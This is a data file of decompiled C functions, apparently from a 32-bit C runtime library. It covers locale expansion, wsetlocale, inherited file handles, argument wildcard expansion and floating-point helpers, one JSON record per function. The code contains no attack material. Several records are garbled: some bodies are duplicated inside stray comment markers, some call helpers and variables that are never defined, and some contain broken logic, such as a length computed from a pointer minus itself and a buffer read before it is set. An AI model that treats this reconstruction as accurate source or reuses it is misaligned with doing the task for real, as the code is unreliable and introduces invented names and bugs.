{"Function Name": "__expandlocale", "Address": "1002a506", "Source Code": "void __cdecl\n__expandlocale(wchar_t *param_1,wchar_t *param_2,rsize_t param_3,wchar_t *param_4,uint param_5,\nUINT *param_6)\n{\n    wchar_t wVar1; \n    UINT *pUVar2; \n    __acrt_ptd *p_Var3; \n    wchar_t *pwVar4; \n    int iVar5; \n    errno_t eVar6; \n    uint uVar7; \n    wchar_t *pwVar8; \n    wchar_t *pwVar9; \n    uint uVar11; \n    bool bVar12; \n    UINT local_1e0; \n    wchar_t *local_1dc; \n    UINT *local_1d8; \n    wchar_t local_1d4[144]; \n    local_1e0 = 0; \n    if (param_1 == (wchar_t *)0x0) goto LAB_1002a542; \n    p_Var3 = FUN_10029224(); \n    local_1d8 = (UINT *)(p_Var3 + 0x68); \n    pwVar4 = (wchar_t *)(p_Var3 + 0x2a0); \n    iVar5 = FUN_10025329(param_4,param_5,pwVar4,0x55); \n    if (iVar5 != 0) goto LAB_1002a877; \n    \n    if ((*param_1 == L'C') && (param_1[1] == L'\\0')) {\n        eVar6 = _wcscpy_s(param_2,param_3,L\"C\"); \n        if (eVar6 == 0) { \n            if (param_6 != (UINT *)0x0) {\n                *param_6 = 0; \n            }\n            goto LAB_1002a542; \n        }\n        goto LAB_1002a877; \n    }\n    pwVar8 = param_1; \n    do {\n        wVar1 = *pwVar8; \n        pwVar8 = pwVar8 + 1; \n    } while (wVar1 != L'\\0'); \n    uVar11 = (int)pwVar8 - (int)(param_1 + 1) >> 1; \n    pwVar8 = local_1dc; \n    pwVar9 = param_1; \n    \n    if (uVar11 < 0x83) {\n        do {\n            wVar1 = *pwVar8; \n            bVar12 = (ushort)wVar1 < (ushort)*pwVar9; \n            if (wVar1 != *pwVar9) {\n                uVar7 = -(uint)bVar12 | 1; \n                goto LAB_1002a631; \n            }\n            if (wVar1 == L'\\0') break; \n            wVar1 = pwVar8[1]; \n            bVar12 = (ushort)wVar1 < (ushort)pwVar9[1]; \n            if (wVar1 != pwVar9[1]) goto LAB_1002a62c; \n            pwVar8 = pwVar8 + 2; \n            pwVar9 = pwVar9 + 2; \n        } while (wVar1 != L'\\0'); \n        uVar7 = 0; \nLAB_1002a631:\n        pwVar8 = (wchar_t *)(p_Var3 + 0x6c); \n        pwVar9 = param_1; \n        if (uVar7 != 0) { \n            do {\n                wVar1 = *pwVar8; \n                bVar12 = (ushort)wVar1 < (ushort)*pwVar9; \n                if (wVar1 != *pwVar9) {\n                    uVar7 = -(uint)bVar12 | 1; \n                    goto LAB_1002a66c; \n                }\n                if (wVar1 == L'\\0') break; \n                wVar1 = pwVar8[1]; \n                bVar12 = (ushort)wVar1 < (ushort)pwVar9[1]; \n                if (wVar1 != pwVar9[1]) goto LAB_1002a667; \n                pwVar8 = pwVar8 + 2; \n                pwVar9 = pwVar9 + 2; \n            } while (wVar1 != L'\\0'); \n            uVar7 = 0; \nLAB_1002a66c:\n            if (uVar7 != 0) goto LAB_1002a674; \n        }\n    } else {\nLAB_1002a674:\n        bVar12 = ___acrt_can_use_vista_locale_apis(); \n        iVar5 = ___lc_wcstolc(local_1d4,param_1); \n        pUVar2 = local_1d8; \n        if (iVar5 == 0) { \n            if (bVar12) {\n                iVar5 = ___acrt_get_qualified_locale(local_1d4,local_1d8,local_1d4); \n            } else {\n                iVar5 = ___acrt_get_qualified_locale_downlevel(local_1d4,local_1d8,local_1d4); \n            }\n            if (iVar5 == 0) goto LAB_1002a727; \n            ___lc_lctowcs(local_1dc,0x83,local_1d4); \n            if (param_4 != (wchar_t *)0x0) { \n                pwVar4 = param_4; \n                goto LAB_1002a7a9; \n            }\n        }\n        else {\nLAB_1002a727:\n            iVar5 = FUN_1002d393(param_1); \n            if (iVar5 == 0) { \n                pwVar4 = param_4; \n                goto LAB_1002a7a9; \n            }\n            iVar5 = FUN_1002d288(param_1,0x20001004,(wchar_t *)&local_1e0,2); \n            if ((iVar5 == 0) || (local_1e0 == 0)) { \n                local_1e0 = GetACP(); \n            }\n            *pUVar2 = local_1e0 & 0xffff; \n            uVar7 = uVar11 + 1; \n            iVar5 = FUN_10025329(local_1dc,0x83,param_1,uVar7); \n            if ((iVar5 != 0) || (iVar5 = FUN_10025329(param_4,param_5,param_1,uVar7), iVar5 != 0)) \n                goto LAB_1002a877; \n            param_5 = 0x55; \n            pwVar8 = param_1; \nLAB_1002a7a9:\n            iVar5 = FUN_10025329(pwVar4,param_5,pwVar8,uVar7); \n            if (iVar5 != 0) goto LAB_1002a877; \n        }\n        \n        if ((*param_1 == L'\\0') || (0x82 < uVar11)) {\n            *(wchar_t *)(p_Var3 + 0x6c) = L'\\0'; \n        } else {\n            iVar5 = FUN_10025329((wchar_t *)(p_Var3 + 0x6c),0x83,param_1,uVar11 + 1); \n            if (iVar5 != 0) goto LAB_1002a877; \n        }\n    }\n    if (param_6 != (UINT *)0x0) { \n        *param_6 = *local_1d8; \n    }\n    eVar6 = _wcscpy_s(param_2,param_3,local_1dc); \n    if (eVar6 == 0) { \nLAB_1002a542:\n        return; \n    }\nLAB_1002a877:\n    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0); \n}"}
{"Function Name": "__wsetlocale", "Address": "1002a8be", "Source Code": "\\*\nwchar_t * __cdecl __wsetlocale(int _Category, wchar_t *_Locale)\n{\n    __acrt_ptd *thread_local_data; \n    wchar_t *locale_variable = (wchar_t *)0x0; \n    if ((uint)_Category < 6) { \n        thread_local_data = FUN_10029224(); \n        ___acrt_eagerly_load_locale_apis(); \n        ___acrt_update_thread_locale_data(); \n        *(uint *)(thread_local_data + 0x350) |= 0x10; \n        \n        __crt_seh_guarded_call<void>::operator()<class_<lambda_135d2772fca65dc1248eeaa1b56e886a>, class_<lambda_2a444430fde8c29194d880d93eed5e8f>&, class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&>(&local_5, \n            (<lambda_135d2772fca65dc1248eeaa1b56e886a> *)&local_5, \n            (void *)&thread_local_data, \n            (void *)&thread_local_data);\n    } else {\n        undefined4 *error_pointer = (undefined4 *)FUN_100253b8(); \n        *error_pointer = 0x16; \n        FUN_1001de96(); \n    }\n    return locale_variable; \n}\n*\\ \n \nwchar_t * __cdecl __wsetlocale(int _Category, wchar_t *_Locale)\n{\n    __acrt_ptd *thread_local_data;\n    wchar_t *locale_variable = (wchar_t *)0x0;\n    if ((uint)_Category < 6) {\n        thread_local_data = FUN_10029224();\n        ___acrt_eagerly_load_locale_apis();\n        ___acrt_update_thread_locale_data();\n        *(uint *)(thread_local_data + 0x350) |= 0x10;\n        __crt_seh_guarded_call<void>::operator()<class_<lambda_135d2772fca65dc1248eeaa1b56e886a>, class_<lambda_2a444430fde8c29194d880d93eed5e8f>&, class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&>(&local_5, \n            (<lambda_135d2772fca65dc1248eeaa1b56e886a> *)&local_5, \n            (void *)&thread_local_data, \n            (void *)&thread_local_data);\n    } else {\n        undefined4 *error_pointer = (undefined4 *)FUN_100253b8();\n        *error_pointer = 0x16;\n        FUN_1001de96();\n    }\n    return locale_variable;\n}"}
{"Function Name": "__wsetlocale_nolock", "Address": "1002aadc", "Source Code": "void __cdecl __wsetlocale_nolock(int locale_id, int category_id, wchar_t *locale_string)\n{\n    wchar_t wide_char; \n    wchar_t *wide_string_ptr; \n    size_t string_length; \n    int return_value; \n    uint comparison_result; \n    int successful_operations_count = 0; \n    wchar_t locale_buffer[132]; \n    uint security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    if (category_id != 0) { \n        if (locale_string != (wchar_t *)0x0) { \n            __wsetlocale_set_cat(locale_id, category_id, locale_string); \n        }\n        goto LAB_1002ad9e; \n    }\n    if (locale_string != (wchar_t *)0x0) { \n        if (((*locale_string == L'L') && (locale_string[1] == L'C')) && (locale_string[2] == L'_')) { \n            do {\n                wide_string_ptr = _wcspbrk(locale_string, L\"=;\"); \n                if (((wide_string_ptr == (wchar_t *)0x0) || (string_length = (int)wide_string_ptr - (int)locale_string >> 1, string_length == 0)) || (*wide_string_ptr == L';')) goto LAB_1002ad9e; \n                int category_index = 1; \n                wchar_t **locale_category_ptr = &PTR_u_LC_COLLATE_1003f794; \n                do {\n                    return_value = _wcsncmp((wchar_t *)*locale_category_ptr, locale_string, string_length); \n                    if (return_value == 0) { \n                        wchar_t *matched_string_ptr = (wchar_t *)*locale_category_ptr + 1; \n                        while (*matched_string_ptr != L'\\0') { \n                            matched_string_ptr++;\n                        }\n                        if (string_length == (int)matched_string_ptr - (int)matched_string_ptr >> 1) break; \n                    }\n                    category_index++; \n                    locale_category_ptr += 3; \n                } while ((int)locale_category_ptr < 0x1003f7c5); \n                wide_string_ptr++; \n                string_length = _wcscspn(wide_string_ptr, L\";\"); \n                if ((string_length == 0) && (*wide_string_ptr != L';')) goto LAB_1002ad9e; \n                if (category_index < 6) { \n                    return_value = FUN_10025329(locale_buffer, 0x83, wide_string_ptr, string_length); \n                    if (return_value != 0) { \n                        goto LAB_1002adb4; \n                    }\n                    if (0x105 < string_length * 2) { \n                        ___report_rangecheckfailure(); \n                        goto LAB_1002adb4; \n                    }\n                    locale_buffer[string_length] = L'\\0'; \n                    return_value = __wsetlocale_set_cat(locale_id, category_index, locale_buffer); \n                    if (return_value != 0) { \n                        successful_operations_count++; \n                    }\n                }\n            } while ((wide_string_ptr[string_length] != L'\\0') && (locale_string = wide_string_ptr + string_length + 1, *locale_string != L'\\0')); \n        } else {\n            int category_index_temp = __expandlocale(locale_string, locale_buffer, 0x83, NULL, 0x55, (UINT *)0x0); \n            if (category_index_temp == 0) goto LAB_1002ad9e; \n            wchar_t **locale_category_ptr_temp = (wchar_t **)(locale_id + 0x20); \n            category_index_temp = 0; \n            do {\n                if (category_index_temp != 0) { \n                    wchar_t *pwVar9 = *locale_category_ptr_temp; \n                    wide_string_ptr = locale_buffer; \n                    do {\n                        comparison_result = (*wide_string_ptr != *pwVar9) ? 1 : 0; \n                        if (*wide_string_ptr == L'\\0') break; \n                        wide_char = wide_string_ptr[1]; \n                        if (wide_char != pwVar9[1]) { \n                            comparison_result = 1; \n                            break;\n                        }\n                        wide_string_ptr += 2; \n                        pwVar9 += 2; \n                    } while (wide_char != L'\\0'); \n                    if (comparison_result == 0) { \n                        return_value++; \n                    } else {\n                        if (__wsetlocale_set_cat(locale_id, category_index_temp, locale_buffer) == 0) { \n                            goto LAB_1002ad9e; \n                        }\n                        return_value++; \n                    }\n                }\n                category_index_temp++; \n                locale_category_ptr_temp += 4; \n            } while (category_index_temp < 6); \n            successful_operations_count = return_value; \n        }\n    }\n    if (successful_operations_count != 0) { \n        __wsetlocale_get_all(locale_id); \n    }\nLAB_1002ad9e: \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "initialize_inherited_file_handles_nolock", "Address": "1002b18d", "Source Code": "void __cdecl initialize_inherited_file_handles_nolock(void)\n{\n    HANDLE fileHandle; \n    DWORD fileType;  \n    int index;    \n    uint *flagsPointer; \n    uint handleCount;   \n    uint loopCounter;   \n    STARTUPINFOW startupInfo; \n    GetStartupInfoW(&startupInfo); \n    \n    if ((startupInfo.cbReserved2 != 0) && ((uint *)startupInfo.lpReserved2 != (uint *)0x0)) {\n        handleCount = *(uint *)startupInfo.lpReserved2; \n        flagsPointer = (uint *)((int)startupInfo.lpReserved2 + 4); \n        HANDLE *handlesPointer = (HANDLE *)((int)flagsPointer + handleCount); \n        \n        if (0x1fff < (int)handleCount) {\n            handleCount = 0x2000; \n        }\n        ___acrt_lowio_ensure_fh_exists(handleCount); \n        \n        if ((int)DAT_10050288 < (int)handleCount) {\n            handleCount = DAT_10050288; \n        }\n        loopCounter = 0; \n        \n        if (handleCount != 0) {\n            do {\n                fileHandle = *handlesPointer; \n                \n                if ((((fileHandle != (HANDLE)0xffffffff) && (fileHandle != (HANDLE)0xfffffffe)) &&\n                    ((*(byte *)flagsPointer & 1) != 0)) &&\n                    ((*(byte *)flagsPointer & 8) != 0 || (fileType = GetFileType(fileHandle), fileType != 0)))) {\n                    \n                    \n                    index = (loopCounter & 0x3f) * 0x30 + (&DAT_10050088)[(int)loopCounter >> 6];\n                    *(HANDLE *)(index + 0x18) = fileHandle; \n                    *(byte *)(index + 0x28) = *(byte *)flagsPointer; \n                }\n                loopCounter++; \n                handlesPointer++; \n                flagsPointer = (uint *)((int)flagsPointer + 1); \n            } while (loopCounter != handleCount); \n        }\n    }\n}"}
{"Function Name": "FUN_1002b344", "Address": "1002b344", "Source Code": "void unlock_function(void) \n{\n    acrt_unlock(7); \n}"}
{"Function Name": "FUN_1002ba50", "Address": "1002ba50", "Source Code": "void __cdecl FUN_1002ba50(int input_integer, uint input_uint, int *output_integer)\n{\n    \n    double converted_double = (double)CONCAT17(input_uint._3_1_, CONCAT16(input_uint._2_1_, CONCAT24((undefined2)input_uint, input_integer)));\n    int denormalized_adjustment;\n    \n    if (NAN(converted_double) == (converted_double == 0.0)) {\n        \n        if (((input_uint & 0x7ff00000) == 0) && (((input_uint & 0xfffff) != 0 || (input_integer != 0)))) {\n            denormalized_adjustment = -0x3fd; \n            uint temp_uint = input_uint; \n            \n            if ((input_uint & 0x100000) == 0) {\n                do {\n                    temp_uint *= 2; \n                    input_uint._0_2_ = (undefined2)temp_uint; \n                    \n                    if (input_integer < 0) {\n                        temp_uint |= 1; \n                        input_uint._0_2_ = (undefined2)temp_uint; \n                    }\n                    input_integer *= 2; \n                    denormalized_adjustment--; \n                } while ((temp_uint & 0x100000) == 0); \n                input_uint = CONCAT22((short)(temp_uint >> 0x10), (undefined2)input_uint); \n            }\n            \n            ushort exponent_mask = (ushort)(input_uint >> 0x10) & 0xffef; \n            input_uint._2_1_ = (undefined)exponent_mask; \n            input_uint._3_1_ = (byte)(exponent_mask >> 8); \n            \n            if (converted_double < 0.0) {\n                input_uint._3_1_ |= 0x80; \n            }\n            \n            __set_exp(CONCAT17(input_uint._3_1_, CONCAT16(input_uint._2_1_, CONCAT24((undefined2)input_uint, input_integer))), 0);\n        } else {\n            \n            __set_exp(converted_double, 0);\n            denormalized_adjustment = (input_uint >> 0x14 & 0x7ff) - 0x3fe; \n        }\n    } else {\n        denormalized_adjustment = 0; \n    }\n    *output_integer = denormalized_adjustment; \n    return; \n}"}
{"Function Name": "__ctrlfp", "Address": "1002bbc4", "Source Code": "int __ctrlfp(undefined4 control_param_1, undefined4 control_param_2)\n{\n    \n    return (int)fpu_control_word;\n}"}
{"Function Name": "FUN_1002bdeb", "Address": "1002bdeb", "Source Code": "uint getFloatingPointControlWord(void) \n{\n    \n    return retrieveFloatingPointControlWord() & 0x300; \n}"}
{"Function Name": "__towlower_l", "Address": "1002bdf6", "Source Code": "wint_t __cdecl __towlower_l(wint_t inputChar, _locale_t locale)\n{\n    int result;                \n    int localeData;            \n    wchar_t convertedCharArray[2];      \n    \n    if (inputChar == 0xffff) {\n        return 0xffff;       \n    }\n    \n    \n    FUN_1001bfff(&localeData, (__acrt_ptd **)locale);\n    \n    \n    if (*(wchar_t **)(localeData + 0xa8) == (wchar_t *)0x0) {\n        \n        if ((ushort)(inputChar - 0x41) < 0x1a) {\n            inputChar = (uint)(ushort)(inputChar + 0x20); \n        }\n    } else {\n        \n        if (0xff < inputChar) {\n            \n            result = ___acrt_LCMapStringW(*(wchar_t **)(localeData + 0xa8), 0x100, (wchar_t *)&inputChar, 1, convertedCharArray, 1);\n            if (result == 0) {\n                convertedCharArray[0] = (wchar_t)inputChar; \n            }\n            goto LAB_1002beab; \n        }\n        \n        result = _iswctype(inputChar, 1);\n        if (result != 0) {\n            \n            convertedCharArray[0] = (wchar_t)*(byte *)(*(int *)(localeData + 0x94) + (inputChar & 0xffff));\n            goto LAB_1002beab; \n        }\n    }\n    \n    convertedCharArray[0] = (wchar_t)inputChar;\nLAB_1002beab:\n    return convertedCharArray[0]; \n}"}
{"Function Name": "FUN_1002bf9e", "Address": "1002bf9e", "Source Code": "int __cdecl FUN_1002bf9e(uchar **param_1, LPVOID *param_2)\n{\n    int returnStatus; \n    LPVOID allocatedMemoryPointer; \n    uchar *currentArgumentPointer; \n    uint expandedArgumentCounter; \n    uint freedArgumentCount = 0; \n    char **currentExpandedArgumentPointer; \n    char **expandedArgumentsStart = (char **)0x0; \n    char **expandedArgumentsEnd = (char **)0x0; \n    char **allocatedArgumentsPointer; \n    char *currentStringLength = (char *)0x0; \n    \n    if (param_2 == (LPVOID *)0x0) {\n        undefined4 *errorCodePointer = (undefined4 *)FUN_100253b8(); \n        returnStatus = 0x16; \n        *errorCodePointer = 0x16; \n        FUN_1001de96(); \n    } else {\n        *param_2 = (LPVOID)0x0; \n        currentArgumentPointer = *param_1; \n        \n        while (currentArgumentPointer != (uchar *)0x0) {\n            currentStringLength = (char *)0x0; \n            currentArgumentPointer = (uchar *)_strpbrk((char *)*param_1, (char *)&currentStringLength); \n            if (currentArgumentPointer == (uchar *)0x0) {\n                \n                returnStatus = FUN_1002c17e((char *)*param_1, (char *)0x0, 0, &expandedArgumentsStart);\n            } else {\n                \n                returnStatus = expand_argument_wildcards<>(*param_1, currentArgumentPointer, &expandedArgumentsStart);\n            }\n            \n            if (returnStatus != 0) goto LAB_1002c12c;\n            param_1 = param_1 + 1; \n            currentArgumentPointer = *param_1; \n        }\n        \n        allocatedArgumentsPointer = (char **)(((int)expandedArgumentsEnd - (int)expandedArgumentsStart >> 2) + 1);\n        uint numberOfExpandedArguments = ~-(uint)(expandedArgumentsEnd < expandedArgumentsStart) & ((int)expandedArgumentsEnd - (int)expandedArgumentsStart + 3U) >> 2;\n        if (numberOfExpandedArguments != 0) {\n            expandedArgumentCounter = 0; \n            do {\n                char *pcVar6 = *expandedArgumentsStart; \n                char *argumentLengthPointer = pcVar6 + 1; \n                while (*pcVar6 != '\\0') { \n                    pcVar6++;\n                }\n                currentStringLength = pcVar6 + (int)(currentStringLength + (1 - (int)argumentLengthPointer)); \n                expandedArgumentsStart++; \n                expandedArgumentCounter++; \n            } while (expandedArgumentCounter != numberOfExpandedArguments); \n        }\n        \n        allocatedMemoryPointer = ___acrt_allocate_buffer_for_argv((uint)allocatedArgumentsPointer, (uint)currentStringLength, 1);\n        if (allocatedMemoryPointer == (LPVOID)0x0) {\n            returnStatus = -1; \n            currentStringLength = (char *)0xffffffff; \n        } else {\n            allocatedArgumentsPointer = (char *)((int)allocatedMemoryPointer + (int)allocatedArgumentsPointer * 4); \n            currentExpandedArgumentPointer = expandedArgumentsStart; \n            if (expandedArgumentsStart != expandedArgumentsEnd) { \n                uint memoryOffset = (int)allocatedMemoryPointer - (int)expandedArgumentsStart; \n                do {\n                    char *currentArgument = *currentExpandedArgumentPointer; \n                    char *argumentLengthPointer = currentArgument; \n                    while (*argumentLengthPointer != '\\0') { \n                        argumentLengthPointer++;\n                    }\n                    argumentLengthPointer = argumentLengthPointer + (1 - (int)(currentArgument + 1)); \n                    returnStatus = FUN_10035efb(allocatedArgumentsPointer, (uint)((int)allocatedArgumentsPointer + ((int)currentStringLength - (int)allocatedArgumentsPointer)), currentArgument, (uint)argumentLengthPointer); \n                    if (returnStatus != 0) { \n                        __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n                    }\n                    *(char **)(memoryOffset + (int)currentExpandedArgumentPointer) = allocatedArgumentsPointer; \n                    currentExpandedArgumentPointer++; \n                    allocatedArgumentsPointer = allocatedArgumentsPointer + (int)argumentLengthPointer; \n                } while (currentExpandedArgumentPointer != expandedArgumentsEnd); \n            }\n            currentStringLength = (char *)0x0; \n            *param_2 = allocatedMemoryPointer; \n            returnStatus = 0; \n        }\n    }\nLAB_1002c12c:\n    uint numberOfExpandedArguments = ~-(uint)(expandedArgumentsEnd < expandedArgumentsStart) & (uint)((int)expandedArgumentsEnd + (3 - (int)expandedArgumentsStart)) >> 2; \n    if (numberOfExpandedArguments != 0) {\n        do {\n            FID_conflict__free(*expandedArgumentsStart); \n            freedArgumentCount++; \n            expandedArgumentsStart++; \n        } while (freedArgumentCount != numberOfExpandedArguments); \n    }\n    FID_conflict__free(expandedArgumentsStart); \n    return returnStatus; \n}"}
{"Function Name": "expand_argument_wildcards<>", "Address": "1002c232", "Source Code": "\\*\nvoid __cdecl expand_argument_wildcards<>(uchar *inputPath, uchar *currentChar, LPCVOID *fileEntries)\n{\n    uchar currentCharacter; \n    byte isPathSeparator; \n    HANDLE fileSearchHandle; \n    int result; \n    BOOL isNextFileAvailable; \n    _WIN32_FIND_DATAA foundFileData; \n    uint securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    \n    for (; currentChar != inputPath && (currentCharacter = *currentChar, currentCharacter != '/' && currentCharacter != '\\\\' && currentCharacter != ':'); currentChar = __mbsdec(inputPath, currentChar)) {}\n    currentCharacter = *currentChar; \n    \n    if (currentCharacter == ':' && currentChar != inputPath + 1) {\n        FUN_1002c17e((char *)inputPath, (char *)0x0, 0, fileEntries); \n    } else {\n        \n        isPathSeparator = (currentCharacter == '/' || currentCharacter == '\\\\' || currentCharacter == '/') ? 1 : 0;\n        _memset(&foundFileData, 0, sizeof(foundFileData)); \n        \n        fileSearchHandle = FindFirstFileExA((LPCSTR)inputPath, FindExInfoStandard, &foundFileData, FindExSearchNameMatch, (LPVOID)0x0, 0);\n        \n        \n        if (fileSearchHandle == (HANDLE)0xffffffff) {\n            FUN_1002c17e((char *)inputPath, (char *)0x0, 0, fileEntries); \n        } else {\n            int entryCount = (int)fileEntries[1] - (int)*fileEntries >> 2; \n            do {\n                \n                if ((foundFileData.cFileName[0] != '.' || (foundFileData.cFileName[1] != '\\0' && (foundFileData.cFileName[1] != '.' || foundFileData.cFileName[2] != '\\0'))) &&\n                    (result = FUN_1002c17e(foundFileData.cFileName, (char *)inputPath, -(uint)isPathSeparator & (uint)(currentChar + (1 - (int)inputPath)), fileEntries), result != 0)) {\n                    goto LAB_1002c302; \n                }\n                isNextFileAvailable = FindNextFileA(fileSearchHandle, &foundFileData); \n            } while (isNextFileAvailable != 0); \n            \n            result = (int)fileEntries[1] - (int)*fileEntries >> 2; \n            \n            if (entryCount != result) {\n                FUN_10035ab0((char *)((int)*fileEntries + entryCount * 4), result - entryCount, 4, FUN_1002bf86);\n            }\n        }\n    LAB_1002c302:\n        \n        if (fileSearchHandle != (HANDLE)0xffffffff) {\n            FindClose(fileSearchHandle);\n        }\n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}\n*\\ \n \nvoid __cdecl expand_argument_wildcards<>(uchar *inputPath, uchar *currentChar, LPCVOID *fileEntries)\n{\n    uchar currentCharacter;\n    byte isPathSeparator;\n    HANDLE fileSearchHandle;\n    int result;\n    BOOL isNextFileAvailable;\n    _WIN32_FIND_DATAA foundFileData;\n    uint securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    for (; currentChar != inputPath && (currentCharacter = *currentChar, currentCharacter != '/' && currentCharacter != '\\\\' && currentCharacter != ':'); currentChar = __mbsdec(inputPath, currentChar)) {}\n    currentCharacter = *currentChar;\n    if (currentCharacter == ':' && currentChar != inputPath + 1) {\n        FUN_1002c17e((char *)inputPath, (char *)0x0, 0, fileEntries);\n    } else {\n        isPathSeparator = (currentCharacter == '/' || currentCharacter == '\\\\' || currentCharacter == '/') ? 1 : 0;\n        _memset(&foundFileData, 0, sizeof(foundFileData));\n        fileSearchHandle = FindFirstFileExA((LPCSTR)inputPath, FindExInfoStandard, &foundFileData, FindExSearchNameMatch, (LPVOID)0x0, 0);\n        \n        if (fileSearchHandle == (HANDLE)0xffffffff) {\n            FUN_1002c17e((char *)inputPath, (char *)0x0, 0, fileEntries);\n        } else {\n            int entryCount = (int)fileEntries[1] - (int)*fileEntries >> 2;\n            do {\n                if ((foundFileData.cFileName[0] != '.' || (foundFileData.cFileName[1] != '\\0' && (foundFileData.cFileName[1] != '.' || foundFileData.cFileName[2] != '\\0'))) &&\n                    (result = FUN_1002c17e(foundFileData.cFileName, (char *)inputPath, -(uint)isPathSeparator & (uint)(currentChar + (1 - (int)inputPath)), fileEntries), result != 0)) {\n                    goto LAB_1002c302;\n                }\n                isNextFileAvailable = FindNextFileA(fileSearchHandle, &foundFileData);\n            } while (isNextFileAvailable != 0);\n            \n            result = (int)fileEntries[1] - (int)*fileEntries >> 2;\n            if (entryCount != result) {\n                FUN_10035ab0((char *)((int)*fileEntries + entryCount * 4), result - entryCount, 4, FUN_1002bf86);\n            }\n        }\n    LAB_1002c302:\n        if (fileSearchHandle != (HANDLE)0xffffffff) {\n            FindClose(fileSearchHandle);\n        }\n    }\n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc);\n    return;\n}"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_ceb1ee4838e85a9d631eb091e2fbe199>,class_<lambda_ae742caa10f662c28703da3d2ea5e57e>&,class_<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37>_>", "Address": "1002c448", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_ceb1ee4838e85a9d631eb091e2fbe199>,class_<lambda_ae742caa10f662c28703da3d2ea5e57e>&,class_<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37>_>\n(__crt_seh_guarded_call<void> *this, \n<lambda_ceb1ee4838e85a9d631eb091e2fbe199> *param_1, \n<lambda_ae742caa10f662c28703da3d2ea5e57e> *param_2, \n<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37> *param_3) \n{\n    ___acrt_lock(*(int *)param_1); \n    param_2->operator()(); \n    FUN_1002c47f(); \n}\n*\\ \n \nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_ceb1ee4838e85a9d631eb091e2fbe199>,class_<lambda_ae742caa10f662c28703da3d2ea5e57e>&,class_<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37>_>\n(__crt_seh_guarded_call<void> *this,<lambda_ceb1ee4838e85a9d631eb091e2fbe199> *param_1,\n<lambda_ae742caa10f662c28703da3d2ea5e57e> *param_2,\n<lambda_cd08b5d6af4937fe54fc07d0c9bf6b37> *param_3)\n{\n    ___acrt_lock(*(int *)param_1);\n    param_2->operator()();\n    FUN_1002c47f();\n}"}
{"Function Name": "FUN_1002c47f", "Address": "1002c47f", "Source Code": "void unlockResourceFunction(void) \n{\n    unlockResource(**(int **)(*(int *)0x10)); \n}"}
{"Function Name": "<lambda_ae742caa10f662c28703da3d2ea5e57e>::operator()", "Address": "1002c4b3", "Source Code": "void __thiscall\n<lambda_ae742caa10f662c28703da3d2ea5e57e>::operator()\n(<lambda_ae742caa10f662c28703da3d2ea5e57e> *this)\n{\n    \n    _memcpy_s(DAT_1005028c, 0x101, (void *)(*(int *)(**(int **)this + 0x48) + 0x18), 0x101);\n    \n    \n    _memcpy_s(DAT_10050290, 0x100, (void *)(*(int *)(**(int **)this + 0x48) + 0x119), 0x100);\n    \n    \n    LOCK();\n    \n    \n    if ((--**(int **)**(undefined4 **)(this + 4) == 0) && (*(undefined **)(void **)**(undefined4 **)(this + 4) != &DAT_1004e5e8)) {\n        \n        FID_conflict__free(*(void **)**(undefined4 **)(this + 4));\n    }\n    \n    \n    *(undefined4 *)**(undefined4 **)(this + 4) = *(undefined4 *)(**(int **)this + 0x48);\n    \n    \n    LOCK();\n    \n    \n    **(int **)(**(int **)this + 0x48) += 1;\n    \n    \n    UNLOCK();\n    \n    \n    return;\n}"}
{"Function Name": "getSystemCP", "Address": "1002c574", "Source Code": "int __cdecl getSystemCP(int codePageRequest)\n{\n    int initializedData; \n    FUN_1001bfff(&initializedData, (__acrt_ptd **)0x0); \n    isCodePageUsed = 0; \n    \n    if (codePageRequest == -2) {\n        isCodePageUsed = 1; \n        codePageRequest = GetOEMCP(); \n    }\n    \n    else if (codePageRequest == -3) {\n        isCodePageUsed = 1; \n        codePageRequest = GetACP(); \n    }\n    \n    else if (codePageRequest == -4) {\n        isCodePageUsed = 1; \n        codePageRequest = *(UINT *)(initializedData + 8); \n    }\n    \n    return codePageRequest; \n}"}
{"Function Name": "FUN_1002c96f", "Address": "1002c96f", "Source Code": "void unlock_function(void) \n{\n    acrt_unlock(5); \n}"}
{"Function Name": "FUN_1002c980", "Address": "1002c980", "Source Code": "undefined4 FUN_1002c980(void) \n{\n    __acrt_ptd *p_Var1; \n    if (DAT_1005029c == '\\0') { \n        \n        __crt_state_management::dual_state_global<char**>::initialize\n        ((dual_state_global<char**> *)&DAT_10050294,(char **)&DAT_1004e5e8);\n        \n        DAT_10050290 = &DAT_1004e3f0; \n        DAT_1005028c = &DAT_1004e2e8;\n        \n        p_Var1 = FUN_100292d8();\n        \n        DAT_1005029c = '\\x01';\n        \n        return CONCAT31((int3)((uint)FUN_1002c7e0(-3,'\\x01',(int)p_Var1,(int **)&DAT_10050294) >> 8),1);\n    }\n    return 1; \n}"}
{"Function Name": "FUN_1002c9cd", "Address": "1002c9cd", "Source Code": "void executeFunction(void) \n{\n    \n    \n    \n    processData((int)retrieveValue(), globalData);\n}"}
{"Function Name": "FUN_1002cd16", "Address": "1002cd16", "Source Code": "void FUN_1002cd16(wchar_t *inputString) \n{\n    <lambda_5a01b672d24c8480ee9d6bdb50dd3881>::<helper_func_stdcall>(inputString); \n}"}
